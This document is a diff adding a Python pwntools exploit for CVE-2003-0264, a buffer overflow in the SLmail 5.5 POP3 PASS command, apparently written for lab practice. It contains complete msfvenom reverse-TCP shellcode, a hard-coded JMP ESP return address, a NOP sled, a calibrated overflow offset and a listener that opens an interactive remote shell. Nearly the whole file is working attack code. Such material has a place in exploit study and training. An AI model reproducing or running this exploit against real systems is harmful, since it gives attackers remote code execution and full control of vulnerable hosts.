@@ -1,0 +1,95 @@
+#!/usr/bin/env python
+#
+# CVE-2003-0264 exploit based on:
+# * pwntools
+# * metasploit reverse_tcp payload
+# * SLmail 5.5 from https://www.exploit-db.com/apps/12f1ab027e5374587e7e998c00682c5d-SLMail55_4433.exe
+
+from pwn import *
+from threading import Thread
+
+
+def generate_payload():
+    # msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.15.101 LPORT=4444 -f python -v shellcode -a x86 --platform windows -b "\x00\x0d\x0a"
+    shellcode = ""
+    shellcode += "\xda\xcb\xba\xaf\xe1\x98\xd7\xd9\x74\x24\xf4\x5e"
+    shellcode += "\x31\xc9\xb1\x52\x83\xc6\x04\x31\x56\x13\x03\xf9"
+    shellcode += "\xf2\x7a\x22\xf9\x1d\xf8\xcd\x01\xde\x9d\x44\xe4"
+    shellcode += "\xef\x9d\x33\x6d\x5f\x2e\x37\x23\x6c\xc5\x15\xd7"
+    shellcode += "\xe7\xab\xb1\xd8\x40\x01\xe4\xd7\x51\x3a\xd4\x76"
+    shellcode += "\xd2\x41\x09\x58\xeb\x89\x5c\x99\x2c\xf7\xad\xcb"
+    shellcode += "\xe5\x73\x03\xfb\x82\xce\x98\x70\xd8\xdf\x98\x65"
+    shellcode += "\xa9\xde\x89\x38\xa1\xb8\x09\xbb\x66\xb1\x03\xa3"
+    shellcode += "\x6b\xfc\xda\x58\x5f\x8a\xdc\x88\x91\x73\x72\xf5"
+    shellcode += "\x1d\x86\x8a\x32\x99\x79\xf9\x4a\xd9\x04\xfa\x89"
+    shellcode += "\xa3\xd2\x8f\x09\x03\x90\x28\xf5\xb5\x75\xae\x7e"
+    shellcode += "\xb9\x32\xa4\xd8\xde\xc5\x69\x53\xda\x4e\x8c\xb3"
+    shellcode += "\x6a\x14\xab\x17\x36\xce\xd2\x0e\x92\xa1\xeb\x50"
+    shellcode += "\x7d\x1d\x4e\x1b\x90\x4a\xe3\x46\xfd\xbf\xce\x78"
+    shellcode += "\xfd\xd7\x59\x0b\xcf\x78\xf2\x83\x63\xf0\xdc\x54"
+    shellcode += "\x83\x2b\x98\xca\x7a\xd4\xd9\xc3\xb8\x80\x89\x7b"
+    shellcode += "\x68\xa9\x41\x7b\x95\x7c\xc5\x2b\x39\x2f\xa6\x9b"
+    shellcode += "\xf9\x9f\x4e\xf1\xf5\xc0\x6f\xfa\xdf\x68\x05\x01"
+    shellcode += "\x88\x56\x72\x06\x2d\x3f\x81\x18\xbc\xe3\x0c\xfe"
+    shellcode += "\xd4\x0b\x59\xa9\x40\xb5\xc0\x21\xf0\x3a\xdf\x4c"
+    shellcode += "\x32\xb0\xec\xb1\xfd\x31\x98\xa1\x6a\xb2\xd7\x9b"
+    shellcode += "\x3d\xcd\xcd\xb3\xa2\x5c\x8a\x43\xac\x7c\x05\x14"
+    shellcode += "\xf9\xb3\x5c\xf0\x17\xed\xf6\xe6\xe5\x6b\x30\xa2"
+    shellcode += "\x31\x48\xbf\x2b\xb7\xf4\x9b\x3b\x01\xf4\xa7\x6f"
+    shellcode += "\xdd\xa3\x71\xd9\x9b\x1d\x30\xb3\x75\xf1\x9a\x53"
+    shellcode += "\x03\x39\x1d\x25\x0c\x14\xeb\xc9\xbd\xc1\xaa\xf6"
+    shellcode += "\x72\x86\x3a\x8f\x6e\x36\xc4\x5a\x2b\x56\x27\x4e"
+    shellcode += "\x46\xff\xfe\x1b\xeb\x62\x01\xf6\x28\x9b\x82\xf2"
+    shellcode += "\xd0\x58\x9a\x77\xd4\x25\x1c\x64\xa4\x36\xc9\x8a"
+    shellcode += "\x1b\x36\xd8"
+
+    # EIP will point to known 'JMP ESP' from non ASLR-enabled module
+    EIP = p32(0x5F4A358F)
+    EBP = 'BBBB'
+
+    NOP = '\x90'
+    buf = NOP * BYTES_TO_FILL
+
+    NOP_slide = NOP * 100
+
+    return buf + EBP + EIP + NOP_slide + shellcode
+
+
+def attack():
+    r = remote(RHOST, RPORT)
+
+    server_helo = r.recvline()
+    if server_helo.startswith('+OK '):
+        log.info('Received server hello')
+    else:
+        log.error('Unknown string received: ' + server_helo)
+
+    r.send('USER whatever\n')
+    r.recvline()
+
+    payload = generate_payload()
+
+    r.send('PASS {}\n'.format(payload))
+    r.shutdown()
+
+
+if __name__ == "__main__":
+    # set target info
+    RHOST = '192.168.15.100'
+    RPORT = 110
+    LPORT = 4444
+
+    # determined with the help of x64dbg
+    BYTES_TO_FILL = 80426
+
+    # set context to target arch
+    context.update(arch='i386', os='windows')
+
+    thread = Thread(target=attack)
+    thread.start()
+
+    listener = listen(port=LPORT)
+    listener.wait_for_connection()
+    listener.interactive()
+
+    thread.join()
